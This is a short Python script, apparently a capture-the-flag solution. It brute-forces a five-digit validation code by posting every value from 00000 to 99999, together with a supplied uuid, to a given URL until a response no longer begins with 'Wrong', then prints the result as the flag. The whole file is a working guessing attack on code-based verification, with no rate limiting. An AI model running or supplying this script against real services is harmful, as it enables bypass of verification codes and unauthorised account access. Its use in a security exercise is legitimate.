import argparse
import requests
import re

def brute_force(uuid, url):
    validate_data = {'uuid': uuid}
    responses = []
    for i in range(100000):
        code = '%05d' % i
        validate_data['validation_code'] = code
        r = requests.post(url, json=validate_data).text

        print(f'{code}:\n{r}')

        mch = re.match(r"Wrong.*", r)
        if mch is None:
            return r   

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('uuid', type=str)
    parser.add_argument('url', type=str)
    args = parser.parse_args()

    input('press enter to start attack')
    print(f'Congratulations, you solved the task. flag:\n{brute_force(args.uuid, args.url)}')